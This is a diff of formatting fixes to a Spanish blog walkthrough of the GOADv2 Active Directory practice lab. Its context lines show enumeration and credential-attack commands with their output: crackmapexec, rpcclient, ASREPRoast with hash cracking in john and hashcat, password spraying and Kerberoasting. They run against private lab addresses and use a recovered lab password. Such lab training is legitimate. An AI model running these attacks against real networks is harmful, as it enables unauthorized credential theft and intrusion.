@@ -6,7 +6,7 @@ excerpt: "Solución a Vulnerabilidades de GOADv2 (Game Of Active Directory v2)"
 date: 2023-08-18
 classes: wide
 header:
-  teaser: /assets/images/2023-08-18-Solución_GOADv2/logo.png
+  teaser: /assets/images/2023-08-18-Solucion_GOADv2/logo.png
   teaser_home_page: true
 categories:
   - Crackmes
@@ -22,25 +22,25 @@ tags:
 
 En esta articulo, vamos a explorar las vulnerabilidades de 'Game Of Active Directory v2'. Veremos cómo atacar y resolver desafíos en castellano.
 
-### [**Mapa Mental**](https://mayfly277.github.io/assets/blog/pentest_ad_dark.svg)
+### [Mapa Mental](https://mayfly277.github.io/assets/blog/pentest_ad_dark.svg)
 
-1. [**Recursos Compartidos**](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46.md)
-2. [**Enumeración de usuarios**](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46.md)
-3. [**Políticas y datos con enum4linux**](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46.md)
-4. [**Buscar contraseñas con Usuarios Enumerados**](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46.md)
-    1. [**ASREPRoast**](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46.md)
-    2. **[Password Spray](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46.md)**
-5. [**Enumeración Con Usuarios**](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46.md)
-    1. **[Dump con ldapdomaindump](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46.md)**
-    2. **[Kerberoasting](Solucio%CC%81n%20a%20Vulnerabilidades%20de%20GOADv2%20(Game%20Of%20Ac%2083f6753c71ba41248a647cbbf3700d46.md)**
+1. [Recursos Compartidos](https://angussmoody.github.io/crackmes/Solucio-n_GOADv2/#recursos-compartidos)
+2. [Enumeración de usuarios](https://angussmoody.github.io/crackmes/Solucio-n_GOADv2/#enumeraci%C3%B3n-de-usuarios)
+3. [Políticas y datos con enum4linux](https://angussmoody.github.io/crackmes/Solucio-n_GOADv2/#pol%C3%ADticas-y-datos-con-enum4linux)
+4. [Buscar contraseñas con Usuarios Enumerados](https://angussmoody.github.io/crackmes/Solucio-n_GOADv2/#buscar-contrase%C3%B1as-con-usuarios-enumerados)
+    1. [ASREPRoast](https://angussmoody.github.io/crackmes/Solucio-n_GOADv2/#asreproast)
+    2. [Password Spray](https://angussmoody.github.io/crackmes/Solucio-n_GOADv2/#password-spray)
+5. [Enumeración Con Usuarios](https://angussmoody.github.io/crackmes/Solucio-n_GOADv2/#enumeraci%C3%B3n-con-usuarios)
+    1. [Dump con ldapdomaindump](https://angussmoody.github.io/crackmes/Solucio-n_GOADv2/#dump-con-ldapdomaindump)
+    2. [Kerberoasting](https://angussmoody.github.io/crackmes/Solucio-n_GOADv2/#kerberoasting)
 
 ---
 
 # Recursos Compartidos
 
-![Untitled](/assets/images/2023-08-18-Solución_GOADv2/Untitled.png)
+![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled.png)
 
-Se puede hacer una revisión de los recursos compartidos con algunas herramientas como **enum4linux** con el comando  `**enum4linux -a -u "" -p "" 192.168.56.23**`
+Se puede hacer una revisión de los recursos compartidos con algunas herramientas como enum4linux con el comando  `enum4linux -a -u "" -p "" 192.168.56.23`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -168,7 +168,7 @@ Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
 enum4linux complete on Wed Jul  5 18:48:08 2023
 ```
 
-También con la herramienta smbmap, al pasar el comando solo con el host, puede que de un error `**smbmap -H 192.168.56.23**`
+También con la herramienta smbmap, al pasar el comando solo con el host, puede que de un error `smbmap -H 192.168.56.23`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -176,7 +176,7 @@ También con la herramienta smbmap, al pasar el comando solo con el host, puede 
 [!] Authentication error on 192.168.56.23
 ```
 
-Pero con un usuario invitado o con un usuario nulo, puede que el resultado sea diferente **`smbmap -H 192.168.56.23 -u 'guest'`**
+Pero con un usuario invitado o con un usuario nulo, puede que el resultado sea diferente `smbmap -H 192.168.56.23 -u 'guest'`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -192,7 +192,7 @@ Pero con un usuario invitado o con un usuario nulo, puede que el resultado sea d
 	public                                            	NO ACCESS	Basic Read share for all domain users
 ```
 
-Otra Herramienta que nos puede server es smbclient, con el comando **`smbclient -N -L 192.168.56.23`**
+Otra Herramienta que nos puede server es smbclient, con el comando `smbclient -N -L 192.168.56.23`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -209,7 +209,7 @@ Otra Herramienta que nos puede server es smbclient, con el comando **`smbclient 
 SMB1 disabled -- no workgroup available
 ```
 
-y por último en estos ejemplo de herramientas podemos usar crackmapexec  con el comando **`cme smb 192.168.56.10-23 -u '' -p '' --shares`**  puede ser que nos de un error, para este ejemplo yo ejecuto el comando cme, ya que tengo el binario de crackmapexec 6.0.0 que se puede descargar desde este [**Link**](https://github.com/mpgn/CrackMapExec/releases/tag/v6.0.0)
+y por último en estos ejemplo de herramientas podemos usar crackmapexec  con el comando `cme smb 192.168.56.10-23 -u '' -p '' --shares`  puede ser que nos de un error, para este ejemplo yo ejecuto el comando cme, ya que tengo el binario de crackmapexec 6.0.0 que se puede descargar desde este [Link](https://github.com/mpgn/CrackMapExec/releases/tag/v6.0.0)
 
 ```jsx
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -227,11 +227,11 @@ SMB         192.168.56.11   445    WINTERFELL       [-] Error enumerating shares
 
 Al igual que con smbmap, puede ser que con un usuario nulo o invitado obtengamos resultados diferentes. Estos comandos nos dan los mismos resultados. Existen muchas más herramientas que se pueden utilizar, pero para este caso solo vamos a utilizar éstas.
 
-`**cme smb 192.168.56.10-23 -u 'null' -p '' --shares**`
+`cme smb 192.168.56.10-23 -u 'null' -p '' --shares`
 
-`**cme smb 192.168.56.10-23 -u 'guest' -p '' --shares**`
+`cme smb 192.168.56.10-23 -u 'guest' -p '' --shares`
 
-`**cme smb 192.168.56.10-23 -u 'a' -p '' --shares**`
+`cme smb 192.168.56.10-23 -u 'a' -p '' --shares`
 
 ```jsx
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -257,9 +257,9 @@ SMB         192.168.56.22   445    CASTELBLACK      [-] Connection Error: The NE
 
 # Enumeración de Usuarios
 
-![Untitled](/assets/images/2023-08-18-Solución_GOADv2/Untitled%201.png)
+![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%201.png)
 
-Para la enumeración de usuarios, también podemos hacerlo con varias herramientas, como por ejemplo **Crackmapexec**, utilizando el siguiente comando: **`cme smb 192.168.56.11 --users`**
+Para la enumeración de usuarios, también podemos hacerlo con varias herramientas, como por ejemplo Crackmapexec, utilizando el siguiente comando: `cme smb 192.168.56.11 --users`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -280,7 +280,7 @@ SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\je
 SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sql_svc                        sql service
 ```
 
-Enumerar usuarios con rpcclient cuando el servicio permite acceso anónimo.**`rpcclient -U "NORTH\\" 192.168.56.11 -N`**
+Enumerar usuarios con rpcclient cuando el servicio permite acceso anónimo.`rpcclient -U "NORTH\\" 192.168.56.11 -N`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -312,7 +312,7 @@ group:[Mormont] rid:[0x454]
 rpcclient $>
 ```
 
-También, si se tiene acceso anónimo, se pueden enumerar usuarios con **net rpc** mediante el comando.**`net rpc group members 'Domain Users' -W 'NORTH' -I '192.168.56.11' -U '%'`**
+También, si se tiene acceso anónimo, se pueden enumerar usuarios con net rpc mediante el comando.`net rpc group members 'Domain Users' -W 'NORTH' -I '192.168.56.11' -U '%'`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -430,9 +430,9 @@ ygritte
 
 Pasar un listado desde Nmap con los comandos.
 
-**`nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='sevenkingdoms.local',userdb=User_nort.txt" 192.168.56.10`**
+`nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='sevenkingdoms.local',userdb=User_nort.txt" 192.168.56.10`
 
-**`nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='essos.local',userdb=User_nort.txt" 192.168.56.12`**
+`nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='essos.local',userdb=User_nort.txt" 192.168.56.12`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -481,7 +481,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.91 seconds
 
 # Políticas y datos con enum4linux
 
-Esto lo podemos realizar con la herramienta crackmapexec, utilizando el comando **`cme smb 192.168.56.11 --pass-pol`**.
+Esto lo podemos realizar con la herramienta crackmapexec, utilizando el comando `cme smb 192.168.56.11 --pass-pol`.
 
 La política de contraseñas indica que si fallamos 5 veces, las cuentas se bloquearán durante 5 minutos.
 
@@ -509,7 +509,7 @@ SMB         192.168.56.11   445    NONE             Account Lockout Threshold: 5
 SMB         192.168.56.11   445    NONE             Forced Log off Time: Not Set
 ```
 
-ver información con **enum4linux** como accesos anónimos, enumeración de usuarios, de grupos, políticas de contraseñas, entre otros.
+ver información con enum4linux como accesos anónimos, enumeración de usuarios, de grupos, políticas de contraseñas, entre otros.
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -750,7 +750,7 @@ enum4linux complete on Tue Jul  4 20:37:56 2023
 
 # Buscar contraseñas con Usuarios Enumerados
 
-Vamos a realizar un ataque llamado **ASREPRoast** con el comando. **`GetNPUsers.py north.sevenkingdoms.local/ -usersfile 11_Users.txt`** 
+Vamos a realizar un ataque llamado ASREPRoast con el comando. `GetNPUsers.py north.sevenkingdoms.local/ -usersfile 11_Users.txt` 
 
 ## ASREPRoast
 
@@ -794,7 +794,7 @@ Actualmente, el TGT que se nos proporcionó se ha guardado en un archivo para su
 ───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-Intentaremos descifrar este hash utilizando John the Ripper o Hashcat. Vamos a intentar ambas opciones. Con John, el comando es el siguiente:**`john --wordlist='/usr/share/wordlists/rockyou.txt' hashbrandon.stark`**
+Intentaremos descifrar este hash utilizando John the Ripper o Hashcat. Vamos a intentar ambas opciones. Con John, el comando es el siguiente:`john --wordlist='/usr/share/wordlists/rockyou.txt' hashbrandon.stark`
 
 ```jsx
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -809,7 +809,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
-Mientras que con Hashcat se utiliza el comando. `**hashcat -a 0 -m 18200 hashbrandon.stark /usr/share/wordlists/rockyou.txt**`
+Mientras que con Hashcat se utiliza el comando. `hashcat -a 0 -m 18200 hashbrandon.stark /usr/share/wordlists/rockyou.txt`
 
 ```jsx
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -875,7 +875,7 @@ Started: Wed Jul  5 20:28:10 2023
 Stopped: Wed Jul  5 20:29:42 2023
 ```
 
-## P**assword Spray**
+## Password Spray
 
 Realizaremos un ataque de "Password Spray", que puede llevarse a cabo mediante varias herramientas, como crackmapexec, utilizando el comando `cme smb 192.168.56.11 -u User_nort.txt -p User_nort.txt --no-bruteforce`. Si el programa encuentra un usuario, se detendrá. Para evitar esto, se debe agregar la bandera `-continue-on-success`.
 
@@ -915,9 +915,9 @@ SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.loca
 
 # Enumeración Con Usuarios
 
-![Untitled](/assets/images/2023-08-18-Solución_GOADv2/Untitled%202.png)
+![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%202.png)
 
-Para obtener una lista completa de los usuarios, se utiliza la herramienta GetADUsers con el siguiente comando:**`GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople`**
+Para obtener una lista completa de los usuarios, se utiliza la herramienta GetADUsers con el siguiente comando:`GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -948,7 +948,7 @@ jeor.mormont                                          2023-01-25 01:00:16.647458
 sql_svc                                               2023-01-25 01:00:18.429356  2023-07-05 19:59:21.431102
 ```
 
-Otra opción es obtener una lista de usuarios mediante LDAP utilizando el siguiente comando: **`ldapsearch -H ldap://192.168.56.11 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'`**
+Otra opción es obtener una lista de usuarios mediante LDAP utilizando el siguiente comando: `ldapsearch -H ldap://192.168.56.11 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'`
 
 ```csharp
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
@@ -1021,15 +1021,15 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 Después de configurar el servidor, puedes acceder a través de tu navegador en "localhost" para visualizar los archivos y cargarlos directamente desde ahí
 
-![Untitled](/assets/images/2023-08-18-Solución_GOADv2/Untitled%203.png)
+![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%203.png)
 
 Cuando observamos el archivo "domain_users.html", su contenido se presenta de la siguiente forma.
 
-![Untitled](/assets/images/2023-08-18-Solución_GOADv2/Untitled%204.png)
+![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%204.png)
 
 Cómo se establece una conexión con "sevenkingdoms.local”
 
-![Untitled](/assets/images/2023-08-18-Solución_GOADv2/Untitled%205.png)
+![Untitled](/assets/images/2023-08-18-Solucion_GOADv2/Untitled%205.png)
 
 Utilizando las credenciales de este usuario, es posible realizar una enumeración de los usuarios presentes en "sevenkingdoms.local", debido a la existencia de una relación de confianza entre los dominios.
 
@@ -1085,7 +1085,7 @@ Un listado completo de los usuarios de "sevenkingdoms.local" ya ha sido obtenido
 
 ## Kerberoasting
 
-Además, se tiene la posibilidad de ejecutar un ataque conocido como "Kerberoasting". Al usar el comando `**GetUserSPNs.py -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople`** se logra la identificación de dos usuarios adicionales
+Además, se tiene la posibilidad de ejecutar un ataque conocido como "Kerberoasting". Al usar el comando `GetUserSPNs.py -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople` se logra la identificación de dos usuarios adicionales
 
 ```jsx
 ┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/10]
